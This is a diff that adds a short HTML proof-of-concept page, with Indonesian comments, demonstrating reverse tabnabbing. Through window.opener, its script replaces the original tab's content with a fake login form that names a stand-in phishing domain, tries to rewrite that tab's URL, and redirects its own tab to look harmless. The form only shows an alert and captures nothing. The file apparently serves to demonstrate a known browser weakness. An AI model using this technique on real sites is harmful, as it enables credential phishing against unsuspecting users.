@@ -1,0 +1,42 @@
+<!-- evil-page.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Halaman Eksternal</h1>
+    <p>Redirect dalam 2 detik...</p>
+    
+    <script>
+        // PoC Tabnabbing
+        setTimeout(() => {
+            // Coba akses dan manipulasi window opener
+            if (window.opener) {
+                // Ubah konten halaman asli
+                window.opener.document.body.innerHTML = `
+                    <h1>WEBSITE PHISHING!</h1>
+                    <p>Login ulang untuk keamanan:</p>
+                    <form onsubmit="alert('Password dicuri!')">
+                        <input type="text" placeholder="Username">
+                        <input type="password" placeholder="Password">
+                        <button type="submit">Login</button>
+                    </form>
+                    <p style="color: red">Situs resmi telah pindah ke: https://evil-phishing.com</p>
+                `;
+                
+                // Ubah URL di address bar (jika memungkinkan)
+                try {
+                    window.opener.history.pushState({}, '', 'https://fake-login-page.com');
+                } catch(e) {
+                    console.log('Tidak bisa mengubah URL');
+                }
+            }
+            
+            // Redirect tab jahat ke situs yang tampak normal
+            window.location.href = "https://google.com";
+            
+        }, 2000);
+    </script>
+</body>
+</html>
